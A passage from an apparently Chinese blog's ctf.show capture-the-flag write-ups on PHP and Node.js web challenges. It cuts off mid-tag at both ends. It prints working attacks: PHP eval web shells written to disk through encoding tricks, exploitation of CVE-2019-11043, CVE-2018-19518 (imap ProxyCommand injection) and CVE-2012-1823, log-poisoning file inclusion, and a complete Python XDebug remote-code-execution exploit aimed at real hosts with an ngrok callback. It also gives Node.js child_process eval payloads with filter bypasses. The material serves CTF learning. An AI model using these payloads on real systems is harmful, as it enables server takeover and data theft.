是被调用的回调函数，其余参数是回调函数的参数。参数callback将被调用的回调函数（callable）。parameter0个或以上的参数，被传入回调函数，可以是数组。</code></pre><p>在php5的环境中,是可以识别16进制的,也就是说,如果传入v2&#x3D;0x66也是可以识别为数字的</p><pre><code>var_dump(is_numeric(&quot;0x66&quot;));  php5的环境下返回true  php7返回false</code></pre><p>之后经过substr的截断也就剩下了66,不带0x的,这里就可以通过调用hex2bin将16进制转换成字符串从而写入木马文件.这里至于为什么要截取两个字符出去,就是因为hex2bin如果参数中带有0x会报错</p><pre><code class="php">&lt;?phpecho hex2bin(&#39;66&#39;);echo hex2bin(&#39;0x66&#39;);PHP Warning:  hex2bin(): Input string must be hexadecimal string in D:\Download\PHP1.php on line 3fWarning: hex2bin(): Input string must be hexadecimal string in D:\Download\PHP1.php on line 3</code></pre><p>那么这里就很清晰了</p><pre><code>&lt;?php @eval($_POST[zf]);?&gt;  -&gt;  0x3c3f70687020406576616c28245f504f53545b7a665d293b3f3e</code></pre><pre><code>?v2=0x3c3f70687020406576616c28245f504f53545b7a665d293b3f3e&amp;v3=1.phpPOSTv1=hex2bin</code></pre><p>但是经过尝试,这里是不可以的哦</p><p>因为在php7的环境下</p><pre><code>var_dump(is_numeric(&quot;0x3c3f706870206576616c28245f504f53545b315d293b3f3e&quot;));  下返回false</code></pre><p>那么我们就必须要让v2均为数字,那就要利用伪协议把内容进行编码转换找到一条语句经过base64编码后再转换为16进制全是数字的.</p><pre><code>$a=&quot;&lt;?=`cat *`;&quot;;$b=base64_encode($a); // PD89YGNhdCAqYDs=$c=bin2hex($b);             //这里直接用去掉=的base64# 5044383959474e6864434171594473如果$c全部都是纯数字就可以了。带e的话会被认为是科学计数法，可以通过is_numeric检测。大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。</code></pre><pre><code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.phpPOSTv1=hex2bin</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404164440314.png" alt="image-20220404164440314"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404164449225.png" alt="image-20220404164449225"></p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><p>&#96;&#96;&#96;php<br> &lt;?php</p><p>&#x2F;*</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p> Author: atao<br> Date:   2020-09-16 11:25:09<br> Last Modified by:   h1xa<br> Last Modified time: 2020-09-23 21:03:24</p><p>*&#x2F;</p><p>highlight_file(<strong>FILE</strong>);<br>$v1 &#x3D; $_POST[‘v1’];<br>$v2 &#x3D; $_GET[‘v2’];<br>$v3 &#x3D; $_GET[‘v3’];<br>$v4 &#x3D; is_numeric($v2) and is_numeric($v3);<br>if($v4){<br>    $s &#x3D; substr($v2,2);<br>    $str &#x3D; call_user_func($v1,$s);<br>    echo $str;<br>    if(!preg_match(“&#x2F;.*p.*h.<em>p.</em>&#x2F;i”,$str))</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpCVE</title>
      <link href="/ctfshow/ctf.show/phpCVE/"/>
      <url>/ctfshow/ctf.show/phpCVE/</url>
      
        <content type="html"><![CDATA[<h1 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272022744.png" alt="image-20220327202246716"></p><p>有点熟悉</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272023627.png" alt="image-20220327202304600"></p><p>提示cve,先查看下版本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272025086.png" alt="image-20220327202509029"></p><p>X-Powered-By:PHP&#x2F;7.1.33dev这个是告知网站是用何种语言或者框架编写的,可以在php.ini中增加或者修改expose_php&#x3D;off进行关闭</p><p>那么这里就需要去寻找这个版本的php漏洞了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272046603.png" alt="image-20220327204633548"></p><p>搜到一个</p><h2 id="CVE-2019-11043复现与学习"><a href="#CVE-2019-11043复现与学习" class="headerlink" title="CVE-2019-11043复现与学习"></a>CVE-2019-11043复现与学习</h2><p>CVE2019-11043是一个远程代码执行漏洞,使用某些特定的Nginx+PHP-FPM的服务器存在漏洞,可以远程代码执行</p><p>向Nginx+PHP-FPM的服务器URL发送%0a时,服务器返回异常,该漏洞需要在nginx.conf中进行特定配置才能出发</p><pre><code>location ~ [^/]\.php(/|$) &#123; ... fastcgi_split_path_info ^(.+?\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass   php:9000; ...&#125;</code></pre><p>PHP的很多框架里面都是通过获取$_SERVER[‘PATH_INFO’]处理路由,这个变量是通过nginx传递过来的,我们在nginx中经常见到</p><pre><code>fastcgi_split_path_info ^(.+\.php)(/.*)$;fastcgi_param PATH_INFO $fastcgi_path_info;</code></pre><p>nginx默认获取不到PATH_INFO的值,得通过fastcgi_split_path_info指定的正则表达式来获取值,^(.+.php)(&#x2F;.*)$;增正则表达式有两个括号,也就是有两个捕获,第二个捕获到的值会自动重新赋值给$fastcgi_path_info变量,第一个捕获到的值会重新赋值给$fastcgi_script_name变量.</p><p>如果访问.index.php&#x2F;test,第二个捕获的是&#x2F;test $fastcgi_path_info就是&#x2F;test,因此就会把&#x2F;test传递给php的$SERVER[‘PATH_INFO’]</p><p>回到本题,这里可以使用换行符(%0a)来破坏fastcgi_split_path_info指令中的Regexp.Regexp被破坏导致PATH_INFO为空,从而触发该漏洞</p><p>开启docker环境</p><pre><code>docker-compose up -d</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272126792.png" alt="image-20220327212614758"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272127784.png" alt="image-20220327212708758"></p><p>访问成功,利用 先安装go环境</p><pre><code>sudo apt install golang        #安装go语言go env -w GOPROXY=https://goproxy.cn      #换一下国内镜像源git clone https://github.com/neex/phuip-fpizdam.git        #下载工具cd phuip-fpizdam    进入目录go get -v &amp;&amp; go build    #应该是编译代码(我也不知道)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272129299.png" alt="image-20220327212937245"></p><p>利用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272130037.png" alt="image-20220327213043987"></p><p>自己读一下显示信息就可以发现传a参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272132391.png" alt="image-20220327213224340"></p><p>这里本地就复现成功了,但是没有反弹shell,这里才测试一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272201489.png" alt="image-20220327220145421"></p><p>远程有点慢,多等等</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272202095.png" alt="image-20220327220209056"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272202925.png" alt="image-20220327220233885"></p><p><strong>反弹shell</strong></p><p>这里面没有nc的命令.所以不能用nc的反弹shell</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272137861.png" alt="image-20220327213700809"></p><p>给此docker容器装一个nc</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272139532.png" alt="image-20220327213917487"></p><p>环境有两个 docker 镜像，一个是nginx，一个是 php</p><p>进入nginx的容器</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272141474.png" alt="image-20220327214132404"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272142790.png" alt="image-20220327214222725"></p><p>装好了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272144138.png" alt="image-20220327214456106"></p><p>远程执行nc 本地监听端口</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272145649.png" alt="image-20220327214506625"></p><p>执行之后发现并没有成功</p><p>接着在php镜像里面再次尝试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272149447.png" alt="image-20220327214953377"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272150448.png" alt="image-20220327215011377"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272151414.png" alt="image-20220327215129345"></p><p>发现成功了</p><p>反弹shell试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272152368.png" alt="image-20220327215256336"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272153989.png" alt="image-20220327215303963"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203272154150.png" alt="image-20220327215404083"></p><h1 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311405199.png" alt="image-20220331140540111"></p><p>先给一个正确的服务器地址 返回了php版本</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311406219.png" alt="image-20220331140600102"></p><p>php&#x3D;5.6.38</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311406261.png" alt="image-20220331140639154"></p><p>错误的返回了nginx&#x2F;1.21.1版本</p><p>百度这个版本搜到了这</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311415242.png" alt="image-20220331141557179"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311425393.png" alt="image-20220331142539347"></p><h2 id="CVE-2018-19518复现与学习"><a href="#CVE-2018-19518复现与学习" class="headerlink" title="CVE-2018-19518复现与学习"></a>CVE-2018-19518复现与学习</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311429507.png" alt="image-20220331142924422"></p><p>本地起一下环境,正确的长这样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311433017.png" alt="image-20220331143317937"></p><p>firefox访问上一个环境有缓存了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311434467.png" alt="image-20220331143400397"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311434519.png" alt="image-20220331143428435"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311434019.png" alt="image-20220331143449921"></p><p>对自己想要发的内容进行一次base64编码</p><pre><code>&lt;?php @eval($_POST[zf]);?&gt;</code></pre><pre><code>PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=</code></pre><p>将文件写入zf.php</p><pre><code>echo &quot;PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=&quot;|base64 -d &gt;/var/www/html/zf.php</code></pre><p>然后对这个在进行base64编码</p><pre><code>ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzNwbVhTazdQejQ9InxiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvemYucGhw</code></pre><p>如果进行base64编码后,含有+&#x3D;,都要进行url编码即%2b %3d,所以为了不出错,最好在对得到的base64编码后的字符进行url编码</p><pre><code>ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzNwbVhTazdQejQ9InxiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvemYucGhw</code></pre><p>然后将hostname换成x+-oProxyCommand%3decho%09[编码后内容]|base64%09-d|sh}</p><pre><code>x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzNwbVhTazdQejQ9InxiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvemYucGhw|base64%09-d|sh&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311515512.png" alt="image-20220331151507363"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311515803.png" alt="image-20220331151515659"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311515345.png" alt="image-20220331151536256"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311517620.png" alt="image-20220331151705536"></p><h1 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404184933022.png" alt="image-20220404184933022"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404185756088.png" alt="image-20220404185756088"></p><p>搜到一个cve-2012-1823</p><p>简单来说,就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。</p><p>启动下靶场</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404192923380.png" alt="image-20220404192923380"></p><p>?-s直接显示源码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404192957710.png" alt="image-20220404192957710"></p><p>还可以通过-d指定auto_prepend_file来制造任意文件包含漏洞</p><pre><code>?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//inputPOST&lt;?php system(&#39;nl `ls`&#39;);?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404193447715.png" alt="image-20220404193447715"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404200331811.png" alt="image-20220404200331811"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404200651329.png" alt="image-20220404200651329"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404200704734.png" alt="image-20220404200704734"></p><h1 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h1><pre><code class="php"> &lt;?phperror_reporting(0);highlight_file(__FILE__);//phpinfo$file = $_GET[&#39;f&#39;];if(!preg_match(&#39;/\:/&#39;,$file))&#123;    include($file);&#125;</code></pre><pre><code>?f=/var/log/nginx/access.log</code></pre><p>日志包含,修改ua</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404201716443.png" alt="image-20220404201716443"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404201644899.png" alt="image-20220404201644899"></p><p>写一句话,直接蚁剑连了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404202010697.png" alt="image-20220404202010697"></p><p>当然也可以session条件竞争,不过没到点不让玩</p><h1 id="web315"><a href="#web315" class="headerlink" title="web315"></a>web315</h1><p>xdebug是php的一个扩展,用于调试php代码,如果目标开启了远程调试模式,并设置remote_connect_bask&#x3D;1</p><pre><code>xdebug.remote_connect_back = 1xdebug.remote_enable = 1</code></pre><p><code>xdebug.remote_connect_back</code> 的回连是通过自定义 Header（<code>xdebug.remote_addr_header</code>）、X-Forwarded-For 和 Remote-Addr 三个确定的，依次 fallback，所以即使配置了自定义 Header，也可以通过设置 XFF 头来指定服务器连接。</p><p>本地测试一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203311537.png" alt="image-20220404203311537"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203317640.png" alt="image-20220404203317640"></p><p>是一个phpinfo页面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203928176.png" alt="image-20220404203928176"></p><p>先监听一个9000端口,在访问页面,如果有反应就存在.就可以确定开启了 Xdebug，且开启了 <code>xdebug.remote_connect_back</code></p><pre><code>curl &#39;http://192.168.5.149:8080/index.php?XDEBUG_SESSION_START=phpstorm&#39; -H &quot;X-Forwarded:192.168.5.139&quot;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203917613.png" alt="image-20220404203917613"></p><p>利用脚本</p><pre><code class="python">#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciifrom concurrent.futures import ThreadPoolExecutorpool = ThreadPoolExecutor(1)session = requests.session()session.headers = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#39;&#125;def recv_xml(sock):    blocks = []    data = b&#39;&#39;    while True:        try:            data = data + sock.recv(1024)        except socket.error as e:            break        if not data:            break        while data:            eop = data.find(b&#39;\x00&#39;)            if eop &lt; 0:                break            blocks.append(data[:eop])            data = data[eop + 1:]        if len(blocks) &gt;= 4:            break    return blocks[3]def trigger(url):    time.sleep(2)    try:        session.get(url + &#39;?XDEBUG_SESSION_START=phpstorm&#39;, timeout=0.1)    except:        passif __name__ == &#39;__main__&#39;:    parser = argparse.ArgumentParser(description=&#39;XDebug remote debug code execution.&#39;)    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, required=True, help=&#39;the code you want to execute.&#39;)    parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, required=True, help=&#39;target url.&#39;)    parser.add_argument(&#39;-l&#39;, &#39;--listen&#39;, default=9000, type=int, help=&#39;local port&#39;)    args = parser.parse_args()    ip_port = (&#39;0.0.0.0&#39;, args.listen)    sk = socket.socket()    sk.settimeout(10)    sk.bind(ip_port)    sk.listen(5)    pool.submit(trigger, args.target)    conn, addr = sk.accept()    conn.sendall(b&#39;&#39;.join([b&#39;eval -i 1 -- &#39;, base64.b64encode(args.code.encode()), b&#39;\x00&#39;]))    data = recv_xml(conn)    print(&#39;[+] Recieve data: &#39; + data.decode())    g = re.search(rb&#39;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#39;, data, re.I)    if not g:        print(&#39;[-] No result...&#39;)        sys.exit(0)    data = g.group(1)    try:        print(&#39;[+] Result: &#39; + base64.b64decode(data).decode())    except binascii.Error:        print(&#39;[-] May be not string result...&#39;)</code></pre><pre><code>python py2.py -t http://192.168.5.149:8080/index.php -c &quot;shell_exec(&#39;id&#39;);&quot;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404204854544.png" alt="image-20220404204854544"></p><pre><code>因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。</code></pre><p>远程</p><pre><code>python e.py -t http://f5720fbb-d704-4892-b328-63480e7341bc.challenge.ctf.show/index.php -c &quot;shell_exec(&#39;id&#39;);&quot;</code></pre><pre><code>curl &#39;http://9def021a-8a10-4b73-a5e3-0b2d9a9f80d0.challenge.ctf.show/index.php?XDEBUG_SESSION_START=phpstorm&#39; -H &quot;X-Forwarded:https://c368-112-38-217-12.ngrok.io&quot;</code></pre><pre><code>python exp.py -t http://49.235.148.38:28100/index.php -c &quot;shell_exec(&#39;id&#39;);&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node.js</title>
      <link href="/ctfshow/ctf.show/node.js/"/>
      <url>/ctfshow/ctf.show/node.js/</url>
      
        <content type="html"><![CDATA[<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p><strong>node.js</strong></p><p>node.js是一个基于Chrome v8引擎的javascript运行环境,可以说node.js是一个运行环境,或者说是一个js语言解释器而不是某种库</p><p>nodejs是基于chrome的v8引擎开发的一个c++程序,目的是用来提供一个js的运行环境.最早nodejs主要是安装在服务器上,辅助大家使用js开发高性能服务器代码,但是后来node.js在前段也大放异彩,带来了web前段开发的革命.node.js下运行js代码有两种方式,一种是在node.js的交互环境下进行,另一种是把代码写入文件中,然后用node命令执行文件代码.node.js跟浏览器是不同的环境,写js代码的时候要注意这些差异.</p><p><strong>题目</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281253885.png" alt="image-20220328125343817"></p><p>总共发现有两个js文件,一个是user.js</p><p><strong>user.js</strong></p><pre><code class="js">module.exports = &#123;  items: [    &#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;  ]&#125;;</code></pre><p>得知username为CTFSHOW与password为123456</p><p><strong>login.js</strong></p><pre><code class="js">var express = require(&#39;express&#39;);var router = express.Router();var users = require(&#39;../modules/user&#39;).items; var findUser = function(name, password)&#123;  return users.find(function(item)&#123;//从user.js中取出username和password来    return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);//name不能等于CTFSHOW大写的,并且提交的name的大写要和user.js的username一样,并且提交的password要和user.js的一样  //那么这里直接就提交小写的ctfshow和123456就好了&#125;;/* GET home page. */router.post(&#39;/&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag=&#39;flag_here&#39;;  var sess = req.session;  var user = findUser(req.body.username, req.body.password);   if(user)&#123;    req.session.regenerate(function(err) &#123;      if(err)&#123;        return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;&#125;);              &#125;             req.session.loginUser = user.username;      res.json(&#123;ret_code: 0, ret_msg: &#39;登录成功&#39;,ret_flag:flag&#125;);    //登录成功就返回flag              &#125;);  &#125;else&#123;    res.json(&#123;ret_code: 1, ret_msg: &#39;账号或密码错误&#39;&#125;);  &#125;    &#125;);module.exports = router;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281303825.png" alt="image-20220328130358724"></p><h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311607473.png" alt="image-20220331160750371"></p><p>查看源码发现提示参数eval</p><p>猜测底层代码可能是</p><pre><code>eval(&#39;console.log(xxx)&#39;)</code></pre><p>可以利用child_process的exec来执行系统命令</p><pre><code>http://de299747-2846-4689-ba6c-07f35da5aa82.challenge.ctf.show/?eval=require(&#39;child_process&#39;).exec(&#39;ls&#39;);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311616011.png" alt="image-20220331161615903"></p><p>但是返回了两个object</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311616505.png" alt="image-20220331161656420"></p><p>原因就是这个exec返回值也是childprocess</p><p>还可以使用execSync()</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311621612.png" alt="image-20220331162150508"></p><pre><code>?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString()</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311618438.png" alt="image-20220331161816355"></p><p>还有spawnSync()函数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311622114.png" alt="image-20220331162224018"></p><pre><code>?eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();?eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</code></pre><p>不需要引入模块的</p><pre><code>?eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;)</code></pre><h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><h2 id="过滤exec字符的命令执行"><a href="#过滤exec字符的命令执行" class="headerlink" title="过滤exec字符的命令执行"></a>过滤exec字符的命令执行</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412211503556.png" alt="image-20220412211503556"></p><p>依旧是命令执行,但是这次exec被过滤了</p><pre><code>?eval=require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39; ).stdout.toString()</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413131928113.png" alt="image-20220413131928113"></p><p>字符串拼接</p><pre><code>?eval=require(&quot;child_process&quot;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;cat fl001g.txt&#39;) ?eval=require( &#39;child_process&#39; ).spawnSync( &#39;cat&#39;,[&#39;fl001g.txt&#39;] ).stdout.toString()</code></pre><p>读取函数</p><pre><code>?eval=require(&quot;fs&quot;).readdirSync(&#39;.&#39;)     查看当前目录（换成/.可查看根目录）?eval=require(&quot;fs&quot;).readFileSync(&#39;fl001g.txt&#39;) --查看指定文件</code></pre><p>在参数内部用eval拼接整体字符串，外层的eval就可以执行命令</p><pre><code>?eval=eval(&quot;require(&#39;child_process&#39;).exe&quot;+&quot;cSync(&#39;ls&#39;)&quot;)</code></pre><h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><h2 id="js数组对象"><a href="#js数组对象" class="headerlink" title="js数组对象"></a>js数组对象</h2><pre><code class="javascript">var express = require(&#39;express&#39;);var router = express.Router();var crypto = require(&#39;crypto&#39;);function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;/* GET home page. */router.get(&#39;/&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag=&#39;xxxxxxx&#39;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;      res.end(flag);  &#125;else&#123;      res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);  &#125;  &#125;);module.exports = router;</code></pre><p>1.php数组就是数组，不能当做字符串调用；而js中几乎每一个数据类型都继承了Object类，拥有toString()方法，如果没有被重写，就返回[object type]</p><p>2.php中，无论是a[0]&#x3D;1,a[1]&#x3D;3…这种key为0,1,2…递增的，还是a[‘x’]&#x3D;1,a[‘y’]&#x3D;2这种自定义key的，都叫做数组array；而js中，前者叫数组，后者叫对象（Object）</p><pre><code class="javascript">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;b=&#123;&#39;x&#39;:&#39;2&#39;&#125;console.log(a + &quot;flag&#123;xxx&#125;&quot;)console.log(b + &quot;flag&#123;xxx&#125;&quot;)#[object Object]flag&#123;xxx&#125;#[object Object]flag&#123;xxx&#125;</code></pre><p>自然这两个的md5也是相等的</p><pre><code>?a[x]=1&amp;b[x]=2</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413134209316.png" alt="image-20220413134209316"></p><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><h3 id="prototype和-proto-分别是什么"><a href="#prototype和-proto-分别是什么" class="headerlink" title="prototype和__proto__分别是什么"></a>prototype和__proto__分别是什么</h3><p>javascript中我们要定义一个类,需要以定义构造函数的方式来定义</p><pre><code class="javascript">function Foo()&#123;    this.bar = 1&#125;new Foo()</code></pre><p>Foo函数的内容,就是Foo类的构造函数,而this.bar就是Foo类的一个属性.一个类必然有一些方法,类似属性this.bar,我们也可以将方法定义在构造函数的内部</p><pre><code class="javascript">function Foo() &#123;    this.bar = 1    this.show = function() &#123;        console.log(this.bar)    &#125;&#125;(new Foo()).show()</code></pre><p>但是这样写有一个问题,就是每当我们创建一个Foo对象的时候,this.show &#x3D; function 就会执行一次,这个show方法实际上是绑定在对象上面的,而不是绑定在类中.我们希望在创建类的时候只创建一次show方法,增时候就需要使用原型(prototype)了</p><pre><code class="javascript">function Foo()&#123;    this.bar = 1&#125;Foo.prototype.show = function show() &#123;    console.log(this.bar)&#125;let foo = new Foo()foo.show()</code></pre><p>我们可以认为原型prototype是类Foo的一个属性,而所有用Foo类实例化的对象,都将拥有这个属性中的所有内容,包括变量和方法.比如上面的foo对象,其天生就有foo.show()方法</p><p>我们可以通过Foo.prototype来访问Foo类的原型,但是Foo实例化出来的对象,是不能通过prototype访问原型的.这个时候,就该到_<em>proto</em>_</p><p>一个Foo实例化出来的foo对象,可以通过foo.__proto__属性来访问Foo类的原型</p><pre><code>foo.__proto__ = Foo.prototype</code></pre><ol><li>prototype是一个类的属性,所有类对象在实例化的时候将会拥有prototype中的属性和方法</li><li>一个对象的__proto__属性,指向这个对象所在类的prototype属性</li></ol><h3 id="javascript原型链继承"><a href="#javascript原型链继承" class="headerlink" title="javascript原型链继承"></a>javascript原型链继承</h3><p>所有类对象在实例化的时候会将拥有prototype中的属性和方法,这个特性被用来实现javascript中的继承机制</p><pre><code class="java">function Father()&#123;    this.first_name = &quot;Donald&quot;    this.last_name = &quot;Trump&quot;    &#125;function Son()&#123;    this.first_name = &quot;Melania&quot;    &#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</code></pre><p>Son类继承了father类的last_name属性,最后输出的是Name: Melania Trump.对于对象son,在调用son.last_name时,实际上javascript引擎会进行如下操作</p><ol><li>在对象son中寻找last_name</li><li>如果找不到,则在son.__proto__中寻找last_name</li><li>如果仍然找不到,则继续在son._<em>proto</em>_.__proto__中寻找last_name</li><li>依次寻找,直到找到null结束.比如,object.prototypt的__proto__就是null</li></ol><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413140624879.png" alt="image-20220413140624879"></p><p>javascript的这个查找的机制,被用在面向对象的继承之中,被称作prototype继承链</p><ol><li>每一个构造函数(constructor)都有一个原型对象(prototypt)</li><li>对象的__proto__属性,指向类的原型对象prototype</li><li>javascript使用prototype链实现继承机制</li></ol><h3 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" 